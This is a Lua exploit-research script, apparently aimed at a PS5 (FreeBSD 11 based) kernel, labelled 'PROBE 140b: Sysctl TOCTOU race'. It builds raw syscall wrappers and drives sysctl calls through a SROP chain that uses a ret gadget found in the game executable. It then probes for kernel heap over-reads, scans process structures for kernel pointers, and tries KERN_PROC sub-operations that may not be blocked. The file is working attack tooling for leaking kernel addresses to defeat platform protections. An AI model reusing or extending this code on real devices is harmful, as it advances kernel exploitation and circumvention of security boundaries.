-- CRASH_CLASS: MODERATE
-- PROBE 140b: Sysctl TOCTOU race for kernel heap leak
--
-- Strategy: Create a thread that rapidly toggles a shared "oldlenp" value
-- between small (4) and large (0x8000). Main thread calls sysctl repeatedly.
-- If kernel reads oldlenp twice (once for validation, once for copyout),
-- we can make it copy more kernel heap data than expected.
--
-- Target sysctls: kern.version, kern.hostname, kern.ostype
-- These return small strings but kernel heap follows.

print("=== PROBE 140b: SYSCTL TOCTOU RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

-- Find eboot text base for gadgets
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local eb_lo = to_num(memory.read_dword(info + 0x108))
local eb_hi = to_num(memory.read_dword(info + 0x10C))
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print("eboot=" .. hex(eboot))

-- Find a ret gadget (0xC3) in eboot
local ret_addr = nil
for off = 0, 0x1000 do
    local ok, b = pcall(function() return memory.read_byte(to_num(eboot) + off) end)
    if ok and to_num(b) == 0xC3 then
        ret_addr = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
        print("ret gadget @ " .. hex(ret_addr) .. " offset=" .. off)
        break
    end
end
if not ret_addr then
    print("NO RET GADGET FOUND!")
    print("=== DONE ===")
    return
end

--------------------------------------------------------------------
-- Thread setup: the thread's job is to rapidly toggle oldlenp
-- Thread function: loop writing alternating values to shared memory
--------------------------------------------------------------------
print("")
print("--- [A] Thread toggle setup ---")

-- Shared control area
local ctrl = gpu + 0x10000  -- control flags
local oldlenp = gpu + 0x10100  -- the oldlenp pointer the sysctl uses
local outbuf = gpu + 0x20000  -- output buffer (0x8000 bytes)

-- Thread context for thr_create
local tctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(tctx)) end)

-- Thread will run a tight loop toggling oldlenp between 4 and 0x8000
-- But we can't run arbitrary code. Thread runs via SROP chain.
-- Instead: thread entry = ret gadget → falls through ret sled → thr_exit
-- We use a different approach: the main thread does both the sysctl calls
-- AND the racing. Since SROP is sequential, we set up the race differently.

-- APPROACH: Instead of true concurrent threads, we use the thread as a
-- signal-based interrupt. Create a thread, then use thr_kill to send it
-- a signal, which triggers signal delivery code that writes to shared memory.

-- Actually, the best approach is: we don't need threads for THIS race.
-- We can try a different TOCTOU: point mib to shared memory and have
-- the thread swap the mib values between two sysctl nodes.

-- BUT: SROP threads can't easily run loops. Let me use a simpler strategy:
-- Create many threads that each write to oldlenp with a large value,
-- then immediately call sysctl. The thread scheduling might cause the
-- write to happen between kernel's validation and copyout.

print("[A] Setting up race...")

-- First, baseline: normal sysctl kern.version {1,4}
local mib = gpu + 0x200
memory.write_dword(mib, 1)      -- CTL_KERN
memory.write_dword(mib + 4, 4)  -- KERN_VERSION
zero(outbuf, 0x8000)
memory.write_dword(oldlenp, 0x400)
memory.write_dword(oldlenp + 4, 0)
local rv_base = srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
local bh, bl = get_hi_lo(rv_base)
local base_len = to_num(memory.read_dword(oldlenp))
print("[A] baseline kern.version ret=" .. hex(rv_base) .. " len=" .. base_len)
if bl == 0 and bh == 0 and base_len > 0 then
    local s = ""
    for i = 0, math.min(base_len, 200) - 1 do
        local b = to_num(memory.read_byte(outbuf + i))
        if b >= 32 and b < 127 then s = s .. string.char(b) end
    end
    print("[A] version: " .. s)
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: Different approach — sysctl buffer overlap
-- Fill the output buffer with a marker pattern, then call sysctl
-- with a length slightly larger than the expected output.
-- Check if kernel wrote past the expected output (heap residue).
--------------------------------------------------------------------
print("")
print("--- [B] Sysctl over-read attempt ---")

-- Test each sysctl with oversized buffer
local targets = {
    {name="kern.version", mib1=1, mib2=4},
    {name="kern.ostype", mib1=1, mib2=1},
    {name="kern.hostname", mib1=1, mib2=10},
    {name="kern.osrelease", mib1=1, mib2=2},
    {name="kern.boottime", mib1=1, mib2=21},
    {name="hw.machine", mib1=6, mib2=1},
    {name="hw.model", mib1=6, mib2=2},
    {name="hw.ncpu", mib1=6, mib2=3},
    {name="hw.physmem", mib1=6, mib2=5},
    {name="hw.pagesize", mib1=6, mib2=7},
}
for _, t in ipairs(targets) do
    -- First get actual length
    memory.write_dword(mib, t.mib1)
    memory.write_dword(mib + 4, t.mib2)
    memory.write_dword(oldlenp, 0)
    memory.write_dword(oldlenp + 4, 0)
    srop(202, ua(mib), uint64(2), uint64(0), ua(oldlenp), uint64(0), uint64(0))
    local actual_len = to_num(memory.read_dword(oldlenp))

    if actual_len > 0 and actual_len < 0x4000 then
        -- Fill with marker pattern
        local check_start = actual_len
        local check_end = math.min(actual_len + 0x100, 0x4000)
        for off = 0, check_end - 1, 4 do
            memory.write_dword(outbuf + off, 0xDEADBEEF)
        end
        -- Now call with oversized length
        memory.write_dword(oldlenp, check_end)
        memory.write_dword(oldlenp + 4, 0)
        local rv = srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
        local rvh, rvl = get_hi_lo(rv)
        local out_len = to_num(memory.read_dword(oldlenp))

        -- Check if kernel wrote past actual_len
        local extra = 0
        for off = actual_len, check_end - 1, 4 do
            local v = to_num(memory.read_dword(outbuf + off))
            if v ~= 0xDEADBEEF then
                extra = extra + 1
            end
        end
        if extra > 0 or out_len > actual_len then
            print(string.format("[B] *** %s: actual=%d out=%d extra_dwords=%d ***",
                t.name, actual_len, out_len, extra))
            -- Scan for kernel pointers in the extra data
            for off = actual_len, check_end - 1, 8 do
                local v = safe_rq(outbuf + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print(string.format("[B] *** KPTR %s+0x%X: %s ***",
                            t.name, off, hex(v)))
                    end
                    if (vh > 0 or vl > 0) and vl ~= 0xDEADBEEF and vh ~= 0xDEADBEEF then
                        print(string.format("[B]   +0x%X: %s", off, hex(v)))
                    end
                end
            end
        else
            local val = safe_rq(outbuf)
            print(string.format("[B] %s: len=%d (clean) val=%s", t.name, actual_len,
                val and hex(val) or "nil"))
        end
    end
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: Deep scan: kern.proc.all = {1, 14, 0}
-- All processes' kinfo_proc structures
--------------------------------------------------------------------
print("")
print("--- [C] kern.proc.all ---")
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 14)
memory.write_dword(mib + 8, 0) -- KERN_PROC_ALL
memory.write_dword(mib + 12, 0)
-- First query length
memory.write_dword(oldlenp, 0)
memory.write_dword(oldlenp + 4, 0)
local rv_cnt = srop(202, ua(mib), uint64(3), uint64(0), ua(oldlenp), uint64(0), uint64(0))
local proc_len = to_num(memory.read_dword(oldlenp))
local proc_len_hi = to_num(memory.read_dword(oldlenp + 4))
print("[C] kern.proc.all: ret=" .. hex(rv_cnt) .. " len=" .. proc_len)

if proc_len > 0 and proc_len < 0x40000 then
    local fetch = math.min(proc_len, 0x20000)
    zero(outbuf, fetch)
    memory.write_dword(oldlenp, fetch)
    memory.write_dword(oldlenp + 4, 0)
    local rv_all = srop(202, ua(mib), uint64(3), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
    local rvah, rval = get_hi_lo(rv_all)
    local got_len = to_num(memory.read_dword(oldlenp))
    print("[C] fetch ret=" .. hex(rv_all) .. " got=" .. got_len)

    if rval == 0 and rvah == 0 and got_len > 0 then
        -- kinfo_proc is 0x448 bytes on FreeBSD 11/PS5
        local kinfo_sz = 0x448
        local n_procs = math.floor(got_len / kinfo_sz)
        print("[C] " .. n_procs .. " processes")

        -- Scan each kinfo_proc for kernel pointers
        for i = 0, math.min(n_procs, 20) - 1 do
            local base = outbuf + (i * kinfo_sz)
            -- ki_pid at +0x44 (FreeBSD 11)
            local ki_pid = to_num(memory.read_dword(base + 0x44))
            -- ki_comm at +0x1BF (FreeBSD 11)
            local comm = ""
            for j = 0, 19 do
                local b = to_num(memory.read_byte(base + 0x1BF + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then comm = comm .. string.char(b) end
            end
            -- Scan for kernel pointers
            local kptrs_this = 0
            for off = 0, kinfo_sz - 1, 8 do
                local v = safe_rq(base + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kptrs_this = kptrs_this + 1
                        kfound = kfound + 1
                        if kptrs_this <= 5 then
                            print(string.format("[C] *** KPTR proc[%d](%s pid=%d) +0x%03X: %s ***",
                                i, comm, ki_pid, off, hex(v)))
                        end
                    end
                end
            end
            if kptrs_this == 0 then
                print(string.format("[C] proc[%d]: pid=%d comm=%s (clean)", i, ki_pid, comm))
            else
                print(string.format("[C] proc[%d]: pid=%d comm=%s KPTRS=%d", i, ki_pid, comm, kptrs_this))
            end
        end
    end
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: sysctl kern.proc.filedesc race - try different MIB encodings
--------------------------------------------------------------------
print("")
print("--- [D] filedesc alternatives ---")
-- Try different KERN_PROC sub-ops that might not be blocked
local sub_ops = {
    {name="KERN_PROC_ARGS", val=7},
    {name="KERN_PROC_ENV", val=35},
    {name="KERN_PROC_GROUPS", val=34},
    {name="KERN_PROC_RLIMIT", val=37},
    {name="KERN_PROC_SIGTRAMP", val=38},
    {name="KERN_PROC_OSREL", val=40},
    {name="KERN_PROC_SIGFASTBLK", val=41},
    {name="KERN_PROC_CWD", val=42},
}
for _, op in ipairs(sub_ops) do
    memory.write_dword(mib, 1)
    memory.write_dword(mib + 4, 14)
    memory.write_dword(mib + 8, op.val)
    memory.write_dword(mib + 12, pid)
    zero(outbuf, 0x1000)
    memory.write_dword(oldlenp, 0x1000)
    memory.write_dword(oldlenp + 4, 0)
    local rv = srop(202, ua(mib), uint64(4), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
    local rvh, rvl = get_hi_lo(rv)
    local got_len = to_num(memory.read_dword(oldlenp))
    if rvl == 0 and rvh == 0 and got_len > 0 then
        print(string.format("[D] *** %s WORKS! len=%d ***", op.name, got_len))
        -- Print string data
        local s = ""
        for i = 0, math.min(got_len, 200) - 1 do
            local b = to_num(memory.read_byte(outbuf + i))
            if b >= 32 and b < 127 then s = s .. string.char(b)
            elseif b == 0 then s = s .. "|"
            else s = s .. "." end
        end
        if #s > 0 then print("[D]   data: " .. s) end
        -- Scan for kernel pointers
        for off = 0, math.min(got_len, 0x1000) - 1, 8 do
            local v = safe_rq(outbuf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[D] *** KPTR %s+0x%X: %s ***",
                        op.name, off, hex(v)))
                end
            end
        end
    else
        print(string.format("[D] %s: ret=%s len=%d", op.name, hex(rv), got_len))
    end
end
print("[D] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
